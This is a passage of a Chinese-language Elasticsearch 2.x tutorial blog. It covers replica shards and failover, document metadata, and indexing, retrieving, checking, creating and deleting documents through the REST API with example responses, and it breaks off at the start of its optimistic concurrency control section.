<p>当你在同一台机器上启动了第二个节点时，只要它和第一个节点有同样的 cluster.name 配置，它就会自动发现集群并加入到其中。 但是在不同机器上启动节点的时候，为了加入到同一集群，你需要配置一个可连接到的单播主机列表。</p>
<p>如果启动了第二个节点，我们的集群将会如下图3所示<br><img src="https://mfaying.github.io/images/elasticsearch2.x/3.jpg" alt="avatar"><br>图3.拥有两个节点的集群——所有主分片和副本分片都已被分配</p>
<p>当第二个节点加入到集群后，3个 副本分片 将会分配到这个节点上——每个主分片对应一个副本分片。 这意味着当集群内任何一个节点出现问题时，我们的数据都完好无损。</p>
<p>所有新近被索引的文档都将会保存在主分片上，然后被并行的复制到对应的副本分片上。这就保证了我们既可以从主分片又可以从副本分片上获得文档。</p>
<p>cluster-health 现在展示的状态为 green ，这表示所有6个分片（包括3个主分片和3个副本分片）都在正常运行。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"cluster_name"</span>: <span class="string">"elasticsearch"</span>,</span><br><span class="line">  <span class="attr">"status"</span>: <span class="string">"green"</span>, </span><br><span class="line">  <span class="attr">"timed_out"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"number_of_nodes"</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">"number_of_data_nodes"</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">"active_primary_shards"</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="attr">"active_shards"</span>: <span class="number">6</span>,</span><br><span class="line">  <span class="attr">"relocating_shards"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"initializing_shards"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"unassigned_shards"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"delayed_unassigned_shards"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"number_of_pending_tasks"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"number_of_in_flight_fetch"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"task_max_waiting_in_queue_millis"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"active_shards_percent_as_number"</span>: <span class="number">100</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="水平扩容"><a href="#水平扩容" class="headerlink" title="水平扩容"></a>水平扩容</h2><p>怎样为我们的正在增长中的应用程序按需扩容呢？ 当启动了第三个节点，我们的集群将会看起来如图4所示。<br><img src="https://mfaying.github.io/images/elasticsearch2.x/4.jpg" alt="avatar"><br>图4.拥有三个节点的集群——为了分散负载而对分片进行重新分配</p>
<p>Node 1 和 Node 2 上各有一个分片被迁移到了新的 Node 3 节点，现在每个节点上都拥有2个分片，而不是之前的3个。 这表示每个节点的硬件资源（CPU, RAM, I/O）将被更少的分片所共享，每个分片的性能将会得到提升。</p>
<p>分片是一个功能完整的搜索引擎，它拥有使用一个节点上的所有资源的能力。 我们这个拥有6个分片（3个主分片和3个副本分片）的索引可以最大扩容到6个节点，每个节点上存在一个分片，并且每个分片拥有所在节点的全部资源。</p>
<p>更多的扩容</p>
<p>但是如果我们想要扩容超过6个节点怎么办呢？</p>
<p>主分片的数目在索引创建时 就已经确定了下来。实际上，这个数目定义了这个索引能够 存储 的最大数据量。（实际大小取决于你的数据、硬件和使用场景。） 但是，读操作——搜索和返回数据——可以同时被主分片 或 副本分片所处理，所以当你拥有越多的副本分片时，也将拥有越高的吞吐量。</p>
<p>在运行中的集群上是可以动态调整副本分片数目的 ，我们可以按需伸缩集群。让我们把副本数从默认的 1 增加到 2 ：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /blogs/_settings</span><br><span class="line">&#123;</span><br><span class="line">   "number_of_replicas" : 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如图5所示， blogs 索引现在拥有9个分片：3个主分片和6个副本分片。 这意味着我们可以将集群扩容到9个节点，每个节点上一个分片。相比原来3个节点时，集群搜索性能可以提升 3 倍。<br><img src="https://mfaying.github.io/images/elasticsearch2.x/5.jpg" alt="avatar"><br>将参数 number_of_replicas 调大到 2</p>
<p>当然，如果只是在相同节点数目的集群上增加更多的副本分片并不能提高性能，因为每个分片从节点上获得的资源会变少。 你需要增加更多的硬件资源来提升吞吐量。</p>
<p>但是更多的副本分片数提高了数据冗余量：按照上面的节点配置，我们可以在失去2个节点的情况下不丢失任何数据。</p>
<h2 id="应对故障"><a href="#应对故障" class="headerlink" title="应对故障"></a>应对故障</h2><p>如果我们关闭第一个节点，这时集群的状态为图6。<br><img src="https://mfaying.github.io/images/elasticsearch2.x/6.jpg" alt="avatar"><br>图6 关闭了一个节点后的集群</p>
<p>我们关闭的节点是一个主节点。而集群必须拥有一个主节点来保证正常工作，所以发生的第一件事情就是选举一个新的主节点： Node 2 。</p>
<p>在我们关闭 Node 1 的同时也失去了主分片 1 和 2 ，并且在缺失主分片的时候索引也不能正常工作。 如果此时来检查集群的状况，我们看到的状态将会为 red ：不是所有主分片都在正常工作。</p>
<p>幸运的是，在其它节点上存在着这两个主分片的完整副本， 所以新的主节点立即将这些分片在 Node 2 和 Node 3 上对应的副本分片提升为主分片， 此时集群的状态将会为 yellow 。 这个提升主分片的过程是瞬间发生的，如同按下一个开关一般。</p>
<p>为什么我们集群状态是 yellow 而不是 green 呢？ 虽然我们拥有所有的三个主分片，但是同时设置了每个主分片需要对应2份副本分片，而此时只存在一份副本分片。 所以集群不能为 green 的状态，不过我们不必过于担心：如果我们同样关闭了 Node 2 ，我们的程序 依然 可以保持在不丢任何数据的情况下运行，因为 Node 3 为每一个分片都保留着一份副本。</p>
<p>如果我们重新启动 Node 1 ，集群可以将缺失的副本分片再次进行分配，那么集群的状态也将如图5所示。 如果 Node 1 依然拥有着之前的分片，它将尝试去重用它们，同时仅从主分片复制发生了修改的数据文件。</p>
<h2 id="数据输入和输出"><a href="#数据输入和输出" class="headerlink" title="数据输入和输出"></a>数据输入和输出</h2><p>面向对象编程语言如此流行的原因之一是对象帮我们表示和处理现实世界具有潜在的复杂的数据结构的实体，到目前为止，一切都很完美！</p>
<p>但是当我们需要存储这些实体时问题来了，传统上，我们以行和列的形式存储数据到关系型数据库中，相当于使用电子表格。 正因为我们使用了这种不灵活的存储媒介导致所有我们使用对象的灵活性都丢失了。</p>
<p>一个 对象 是基于特定语言的内存的数据结构。 为了通过网络发送或者存储它，我们需要将它表示成某种标准的格式。 JSON 是一种以人可读的文本表示对象的方法。 它已经变成 NoSQL 世界交换数据的事实标准。当一个对象被序列化成为 JSON，它被称为一个 JSON 文档 。</p>
<p>Elastcisearch 是分布式的 文档 存储。它能存储和检索复杂的数据结构–序列化成为JSON文档–以 实时 的方式。 换句话说，一旦一个文档被存储在 Elasticsearch 中，它就是可以被集群中的任意节点检索到。</p>
<p>在 Elasticsearch 中， 每个字段的所有数据 都是 默认被索引的 。 即每个字段都有为了快速检索设置的专用倒排索引。而且，不像其他多数的数据库，它能在 相同的查询中 使用所有这些倒排索引，并以惊人的速度返回结果。</p>
<h2 id="什么是文档"><a href="#什么是文档" class="headerlink" title="什么是文档?"></a>什么是文档?</h2><p>在大多数应用中，多数实体或对象可以被序列化为包含键值对的 JSON 对象。 一个 键 可以是一个字段或字段的名称，一个 值 可以是一个字符串，一个数字，一个布尔值， 另一个对象，一些数组值，或一些其它特殊类型诸如表示日期的字符串，或代表一个地理位置的对象：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"name"</span>:         <span class="string">"John Smith"</span>,</span><br><span class="line">    <span class="attr">"age"</span>:          <span class="number">42</span>,</span><br><span class="line">    <span class="attr">"confirmed"</span>:    <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"join_date"</span>:    <span class="string">"2014-06-01"</span>,</span><br><span class="line">    <span class="attr">"home"</span>: &#123;</span><br><span class="line">        <span class="attr">"lat"</span>:      <span class="number">51.5</span>,</span><br><span class="line">        <span class="attr">"lon"</span>:      <span class="number">0.1</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"accounts"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"facebook"</span>,</span><br><span class="line">            <span class="attr">"id"</span>:   <span class="string">"johnsmith"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"twitter"</span>,</span><br><span class="line">            <span class="attr">"id"</span>:   <span class="string">"johnsmith"</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>通常情况下，我们使用的术语 对象 和 文档 是可以互相替换的。不过，有一个区别： 一个对象仅仅是类似于 hash 、 hashmap 、字典或者关联数组的 JSON 对象，对象中也可以嵌套其他的对象。 对象可能包含了另外一些对象。在 Elasticsearch 中，术语 文档 有着特定的含义。它是指最顶层或者根对象, 这个根对象被序列化成 JSON 并存储到 Elasticsearch 中，指定了唯一 ID。</p>
<p>字段的名字可以是任何合法的字符串，但不可以包含时间段。</p>
<h2 id="文档元数据"><a href="#文档元数据" class="headerlink" title="文档元数据"></a>文档元数据</h2><p>元数据 —— 有关 文档的信息。 三个必须的元数据元素如下:<br>_index 文档在哪存放<br>_type 文档表示的对象类别<br>_id 文档唯一标识</p>
<p>_index</p>
<p>一个 索引 应该是因共同的特性被分组到一起的文档集合。 例如，你可能存储所有的产品在索引 products 中，而存储所有销售的交易到索引 sales 中。 </p>
<p>实际上，在 Elasticsearch 中，我们的数据是被存储和索引在 分片 中，而一个索引仅仅是逻辑上的命名空间， 这个命名空间由一个或者多个分片组合在一起。 然而，这是一个内部细节，我们的应用程序根本不应该关心分片，对于应用程序而言，只需知道文档位于一个 索引 内。 Elasticsearch 会处理所有的细节。</p>
<p>我们让 Elasticsearch 帮我们创建索引。 所有需要我们做的就是选择一个索引名，这个名字必须小写，不能以下划线开头，不能包含逗号。</p>
<p>_type</p>
<p>数据可能在索引中只是松散的组合在一起，但是通常明确定义一些数据中的子分区是很有用的。 例如，所有的产品都放在一个索引中，但是你有许多不同的产品类别，比如 “electronics” 、 “kitchen” 和 “lawn-care”。</p>
<p>这些文档共享一种相同的（或非常相似）的模式：他们有一个标题、描述、产品代码和价格。他们只是正好属于“产品”下的一些子类。</p>
<p>Elasticsearch 公开了一个成为 types （类型）的特性，它允许您在索引中对数据进行逻辑分区。不同 types 的文档可能有不同的字段，但最好能够非常相似。</p>
<p>一个 _type 命名可以是大写或者小写，但是不能以下划线或者句号开头，不应该包含逗号， 并且长度限制为256个字符.</p>
<p>_id</p>
<p>ID 是一个字符串， 当它和 _index 以及 _type 组合就可以唯一确定 Elasticsearch 中的一个文档。 当你创建一个新的文档，要么提供自己的 _id ，要么让 Elasticsearch 帮你生成。</p>
<p>其他元数据</p>
<p>还有一些其他的元数据元素，他们在 类型和映射 进行了介绍。通过前面已经列出的元数据元素， 我们已经能存储文档到 Elasticsearch 中并通过 ID 检索它–换句话说，使用 Elasticsearch 作为文档的存储介质。</p>
<h2 id="索引文档"><a href="#索引文档" class="headerlink" title="索引文档"></a>索引文档</h2><p>通过使用 index API ，文档可以被 索引 —— 存储和使文档可被搜索 。 但是首先，我们要确定文档的位置。正如我们刚刚讨论的，一个文档的 _index 、 _type 和 _id 唯一标识一个文档。 我们可以提供自定义的 _id 值，或者让 index API 自动生成。</p>
<p>使用自定义的 ID</p>
<p>如果你的文档有一个自然的 标识符 （例如，一个 user_account 字段或其他标识文档的值），你应该使用如下方式的 index API 并提供你自己 _id ：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /&#123;index&#125;/&#123;type&#125;/&#123;id&#125;</span><br><span class="line">&#123;</span><br><span class="line">  "field": "value",</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>举个例子，如果我们的索引称为 website ，类型称为 blog ，并且选择 123 作为 ID<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /website/blog/123</span><br><span class="line">&#123;</span><br><span class="line">  "title": "My first blog entry",</span><br><span class="line">  "text":  "Just trying this out...",</span><br><span class="line">  "date":  "2014/01/01"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Elasticsearch 响应体如下所示：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"_index"</span>:    <span class="string">"website"</span>,</span><br><span class="line">   <span class="attr">"_type"</span>:     <span class="string">"blog"</span>,</span><br><span class="line">   <span class="attr">"_id"</span>:       <span class="string">"123"</span>,</span><br><span class="line">   <span class="attr">"_version"</span>:  <span class="number">1</span>,</span><br><span class="line">   <span class="attr">"created"</span>:   <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>该响应表明文档已经成功创建，该索引包括 _index 、 _type 和 _id 元数据， 以及一个新元素： _version 。</p>
<p>在 Elasticsearch 中每个文档都有一个版本号。当每次对文档进行修改时（包括删除）， _version 的值会递增。 在 处理冲突 中，我们讨论了怎样使用 _version 号码确保你的应用程序中的一部分修改不会覆盖另一部分所做的修改。</p>
<p>如果你的数据没有自然的 ID， Elasticsearch 可以帮我们自动生成 ID 。 请求的结构调整为： 不再使用 PUT 谓词(“使用这个 URL 存储这个文档”)， 而是使用 POST 谓词(“存储文档在这个 URL 命名空间下”)。</p>
<p>现在该 URL 只需包含 _index 和 _type :<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /website/blog/</span><br><span class="line">&#123;</span><br><span class="line">  "title": "My second blog entry",</span><br><span class="line">  "text":  "Still trying this out...",</span><br><span class="line">  "date":  "2014/01/01"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>除了 _id 是 Elasticsearch 自动生成的，响应的其他部分和前面的类似：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"_index"</span>:    <span class="string">"website"</span>,</span><br><span class="line">   <span class="attr">"_type"</span>:     <span class="string">"blog"</span>,</span><br><span class="line">   <span class="attr">"_id"</span>:       <span class="string">"AVFgSgVHUP18jI2wRx0w"</span>,</span><br><span class="line">   <span class="attr">"_version"</span>:  <span class="number">1</span>,</span><br><span class="line">   <span class="attr">"created"</span>:   <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>自动生成的 ID 是 URL-safe、 基于 Base64 编码且长度为20个字符的 GUID 字符串。 这些 GUID 字符串由可修改的 FlakeID 模式生成，这种模式允许多个节点并行生成唯一 ID ，且互相之间的冲突概率几乎为零。</p>
<h2 id="取回一个文档"><a href="#取回一个文档" class="headerlink" title="取回一个文档"></a>取回一个文档</h2><p>为了从 Elasticsearch 中检索出文档 ，我们仍然使用相同的 _index , _type , 和 _id ，但是 HTTP 谓词 更改为 GET :<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /website/blog/123?pretty</span><br></pre></td></tr></table></figure></p>
<p>响应体包括目前已经熟悉了的元数据元素，再加上 _source 字段，这个字段包含我们索引数据时发送给 Elasticsearch 的原始 JSON 文档：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"_index"</span> :   <span class="string">"website"</span>,</span><br><span class="line">  <span class="attr">"_type"</span> :    <span class="string">"blog"</span>,</span><br><span class="line">  <span class="attr">"_id"</span> :      <span class="string">"123"</span>,</span><br><span class="line">  <span class="attr">"_version"</span> : <span class="number">1</span>,</span><br><span class="line">  <span class="attr">"found"</span> :    <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"_source"</span> :  &#123;</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"My first blog entry"</span>,</span><br><span class="line">      <span class="attr">"text"</span>:  <span class="string">"Just trying this out..."</span>,</span><br><span class="line">      <span class="attr">"date"</span>:  <span class="string">"2014/01/01"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>注:在请求的查询串参数中加上 pretty 参数， 正如前面的例子中看到的，这将会调用 Elasticsearch 的 pretty-print 功能，该功能 使得 JSON 响应体更加可读。但是， _source 字段不能被格式化打印出来。相反，我们得到的 _source 字段中的 JSON 串，刚好是和我们传给它的一样。</p>
<p>GET 请求的响应体包括 {“found”: true} ，这证实了文档已经被找到。 如果我们请求一个不存在的文档，我们仍旧会得到一个 JSON 响应体，但是 found 将会是 false 。 此外， HTTP 响应码将会是 404 Not Found ，而不是 200 OK 。</p>
<p>我们可以通过传递 -i 参数给 curl 命令，该参数 能够显示响应的头部：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -i -XGET http://localhost:9200/website/blog/124?pretty</span><br></pre></td></tr></table></figure></p>
<p>显示响应头部的响应体现在类似这样：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 404 Not Found</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Content-Length: 83</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"_index"</span> : <span class="string">"website"</span>,</span><br><span class="line">  <span class="attr">"_type"</span> :  <span class="string">"blog"</span>,</span><br><span class="line">  <span class="attr">"_id"</span> :    <span class="string">"124"</span>,</span><br><span class="line">  <span class="attr">"found"</span> :  <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>返回文档的一部分</p>
<p>默认情况下， GET 请求 会返回整个文档，这个文档正如存储在 _source 字段中的一样。但是也许你只对其中的 title 字段感兴趣。单个字段能用 _source 参数请求得到，多个字段也能使用逗号分隔的列表来指定。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /website/blog/123?_source=title,text</span><br></pre></td></tr></table></figure>
<p>该 _source 字段现在包含的只是我们请求的那些字段，并且已经将 date 字段过滤掉了。<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"_index"</span> :   <span class="string">"website"</span>,</span><br><span class="line">  <span class="attr">"_type"</span> :    <span class="string">"blog"</span>,</span><br><span class="line">  <span class="attr">"_id"</span> :      <span class="string">"123"</span>,</span><br><span class="line">  <span class="attr">"_version"</span> : <span class="number">1</span>,</span><br><span class="line">  <span class="attr">"found"</span> :   <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"_source"</span> : &#123;</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"My first blog entry"</span> ,</span><br><span class="line">      <span class="attr">"text"</span>:  <span class="string">"Just trying this out..."</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>或者，如果你只想得到 _source 字段，不需要任何元数据，你能使用 _source 端点：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /website/blog/123/_source</span><br></pre></td></tr></table></figure></p>
<p>那么返回的的内容如下所示：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"title"</span>: <span class="string">"My first blog entry"</span>,</span><br><span class="line">   <span class="attr">"text"</span>:  <span class="string">"Just trying this out..."</span>,</span><br><span class="line">   <span class="attr">"date"</span>:  <span class="string">"2014/01/01"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="检查文档是否存在"><a href="#检查文档是否存在" class="headerlink" title="检查文档是否存在"></a>检查文档是否存在</h2><p>HEAD 方法检查一个文档是否存在,HEAD 请求没有返回体，只返回一个 HTTP 请求报头：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -i -XHEAD http://localhost:9200/website/blog/123</span><br></pre></td></tr></table></figure></p>
<p>如果文档存在， Elasticsearch 将返回一个 200 ok 的状态码：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure></p>
<p>若文档不存在， Elasticsearch 将返回一个 404 Not Found 的状态码：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -i -XHEAD http://localhost:9200/website/blog/124</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 404 Not Found</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
<p>当然，一个文档仅仅是在检查的时候不存在，并不意味着一毫秒之后它也不存在：也许同时正好另一个进程就创建了该文档。</p>
<h2 id="更新整个文档"><a href="#更新整个文档" class="headerlink" title="更新整个文档"></a>更新整个文档</h2><p>在 Elasticsearch 中文档是 不可改变 的，不能修改它们。 相反，如果想要更新现有的文档，需要 重建索引 或者进行替换， 我们可以使用相同的 index API 进行实现，在 索引文档 中已经进行了讨论。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /website/blog/123</span><br><span class="line">&#123;</span><br><span class="line">  "title": "My first blog entry",</span><br><span class="line">  "text":  "I am starting to get the hang of this...",</span><br><span class="line">  "date":  "2014/01/02"</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在响应体中，我们能看到 Elasticsearch 已经增加了 _version 字段值：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"_index"</span> :   <span class="string">"website"</span>,</span><br><span class="line">  <span class="attr">"_type"</span> :    <span class="string">"blog"</span>,</span><br><span class="line">  <span class="attr">"_id"</span> :      <span class="string">"123"</span>,</span><br><span class="line">  <span class="attr">"_version"</span> : <span class="number">2</span>,</span><br><span class="line">  <span class="attr">"created"</span>:   <span class="literal">false</span> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>created 标志设置成 false ，是因为相同的索引、类型和 ID 的文档已经存在。</p>
<p>在内部，Elasticsearch 已将旧文档标记为已删除，并增加一个全新的文档。 尽管你不能再对旧版本的文档进行访问，但它并不会立即消失。当继续索引更多的数据，Elasticsearch 会在后台清理这些已删除文档。</p>
<p>在本章的后面部分，我们会介绍 update API, 这个 API 可以用于 partial updates to a document 。 虽然它似乎对文档直接进行了修改，但实际上 Elasticsearch 按前述完全相同方式执行以下过程：</p>
<p>1.从旧文档构建 JSON<br>2.更改该 JSON<br>3.删除旧文档<br>4.索引一个新文档</p>
<p>唯一的区别在于, update API 仅仅通过一个客户端请求来实现这些步骤，而不需要单独的 get 和 index 请求。</p>
<h2 id="创建新文档"><a href="#创建新文档" class="headerlink" title="创建新文档"></a>创建新文档</h2><p>当我们索引一个文档， 怎么确认我们正在创建一个完全新的文档，而不是覆盖现有的呢？</p>
<p>_index 、 _type 和 _id 的组合可以唯一标识一个文档。所以，确保创建一个新文档的最简单办法是，使用索引请求的 POST 形式让 Elasticsearch 自动生成唯一 _id :<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">POST /website/blog/</span><br><span class="line">&#123; ... &#125;</span><br></pre></td></tr></table></figure></p>
<p>然而，如果已经有自己的 _id ，那么我们必须告诉 Elasticsearch ，只有在相同的 _index 、 _type 和 _id 不存在时才接受我们的索引请求。这里有两种方式，他们做的实际是相同的事情。使用哪种，取决于哪种使用起来更方便。</p>
<p>第一种方法使用 op_type 查询 -字符串参数：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /website/blog/123?op_type=create</span><br><span class="line">&#123; ... &#125;</span><br></pre></td></tr></table></figure></p>
<p>第二种方法是在 URL 末端使用 /_create :<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /website/blog/123/_create</span><br><span class="line">&#123; ... &#125;</span><br></pre></td></tr></table></figure></p>
<p>如果创建新文档的请求成功执行，Elasticsearch 会返回元数据和一个 201 Created 的 HTTP 响应码。</p>
<p>另一方面，如果具有相同的 _index 、 _type 和 _id 的文档已经存在，Elasticsearch 将会返回 409 Conflict 响应码，以及如下的错误信息：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="attr">"error"</span>: &#123;</span><br><span class="line">      <span class="attr">"root_cause"</span>: [</span><br><span class="line">         &#123;</span><br><span class="line">            <span class="attr">"type"</span>: <span class="string">"document_already_exists_exception"</span>,</span><br><span class="line">            <span class="attr">"reason"</span>: <span class="string">"[blog][123]: document already exists"</span>,</span><br><span class="line">            <span class="attr">"shard"</span>: <span class="string">"0"</span>,</span><br><span class="line">            <span class="attr">"index"</span>: <span class="string">"website"</span></span><br><span class="line">         &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"type"</span>: <span class="string">"document_already_exists_exception"</span>,</span><br><span class="line">      <span class="attr">"reason"</span>: <span class="string">"[blog][123]: document already exists"</span>,</span><br><span class="line">      <span class="attr">"shard"</span>: <span class="string">"0"</span>,</span><br><span class="line">      <span class="attr">"index"</span>: <span class="string">"website"</span></span><br><span class="line">   &#125;,</span><br><span class="line">   <span class="attr">"status"</span>: <span class="number">409</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="删除文档"><a href="#删除文档" class="headerlink" title="删除文档"></a>删除文档</h2><p>使用 DELETE 方法：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DELETE /website/blog/123</span><br></pre></td></tr></table></figure></p>
<p>如果找到该文档，Elasticsearch 将要返回一个 200 ok 的 HTTP 响应码，和一个类似以下结构的响应体。注意，字段 _version 值已经增加:<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"found"</span> :    <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"_index"</span> :   <span class="string">"website"</span>,</span><br><span class="line">  <span class="attr">"_type"</span> :    <span class="string">"blog"</span>,</span><br><span class="line">  <span class="attr">"_id"</span> :      <span class="string">"123"</span>,</span><br><span class="line">  <span class="attr">"_version"</span> : <span class="number">3</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如果文档没有 找到，我们将得到 404 Not Found 的响应码和类似这样的响应体：<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"found"</span> :    <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"_index"</span> :   <span class="string">"website"</span>,</span><br><span class="line">  <span class="attr">"_type"</span> :    <span class="string">"blog"</span>,</span><br><span class="line">  <span class="attr">"_id"</span> :      <span class="string">"123"</span>,</span><br><span class="line">  <span class="attr">"_version"</span> : <span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>即使文档不存在（ Found 是 false ）， _version 值仍然会增加。这是 Elasticsearch 内部记录本的一部分，用来确保这些改变在跨多节点时以正确的顺序执行。</p>
<p>正如已经在更新整个文档中提到的，删除文档不会立即将文档从磁盘中删除，只是将文档标记为已删除状态。随着你不断的索引更多的数据，Elasticsearch 将会在后台清理标记为已删除的文档。</p>
<h2 id="处理冲突"><a href="#处理冲突" class="headerlink" title="处理冲突"></a>处理冲突</h2><p>当我们使用 index API 更新文档 ，可以一次性读取原始文档，做我们的修改，然后重新索引 整个文档 。 最近的索引请求将获胜：无论最后哪一个文档被索引，都将被唯一存储在 Elasticsearch 中。如果其他人同时更改这个文档，他们的更改将丢失。</p>
<p>但有时丢失了一个变更就是 非常严重的 。试想我们使用 Elasticsearch 存储我们网上商城商品库存的数量， 每次我们卖一个商品的时候，我们在 Elasticsearch 中将库存数量减少。</p>
<p>有一天，我们一秒要卖好几个商品。 假设有两个 web 程序并行运行，每一个都同时处理所有商品的销售，如图7所示。<br><img src="https://mfaying.github.io/images/elasticsearch2.x/7.jpg" alt="avatar"><br>图7 Consequence of no concurrency control<br>web_1 对 stock_count 所做的更改已经丢失，因为 web_2 不知道它的 stock_count 的拷贝已经过期。 </p>
<p>变更越频繁，读数据和更新数据的间隙越长，也就越可能丢失变更。</p>
<p>在数据库领域中，有两种方法通常被用来确保并发更新时变更不会丢失：</p>
<p>1.悲观并发控制<br>这种方法被关系型数据库广泛使用，它假定有变更冲突可能发生，因此阻塞访问资源以防止冲突。 一个典型的例子是读取一行数据之前先将其锁住，确保只有放置锁的线程能够对这行数据进行修改。</p>
<p>2.乐观并发控制<br>Elasticsearch 中使用的这种方法假定冲突是不可能发生的，并且不会阻塞正在尝试的操作。 然而，如果源数据在读写当中被修改，更新将会失败。应用程序接下来将决定该如何解决冲突。 例如，可以重试更新、使用新的数据、或者将相关情况报告给用户。</p>
<h2 id="乐观并发控制"><a href="#乐观并发控制" class="headerlink" title="乐观并发控制"></a>乐观并发控制</h2><p>Elasticsearch 是分布式的。当文档创建、更新或删除时， 新版本的文档必须复制到集群中的其他节点。Elasticsearch 也是异步和并发的，这意味着这些复制请求被并行发送，并且到达目的地时也许 顺序是乱的 。 Elasticsearch 需要一种方法确保文档的旧版本不会覆盖新的版本。</p>
<p>当我们之前讨论 index ， GET 和 delete 请求时，我们指出每个文档都有一个 _version （版本）号，当文档被修改时版本号递增。 Elasticsearch 使用这个 _version 号来确保变更以正确顺序得到执行。如果旧版本的文档在新版本之后到达，它可以被简单的忽略。</p>
<p>我们可以利用 _version 号来确保 应用中相互冲突的变更不会导致数据丢失。我们通过指定想要修改文档的 version 号来达到这个目的。 如果该版本不是当前版本号，我们的请求将会失败。</p>
<p>让我们创建一个新的博客文章：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PUT /website/blog/1/_create</span><br><span class="line">&#123;</span><br><span class="line">  "title": "My first blog entry",</span><br><span class="line">  "text":  "Just trying this out..."</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
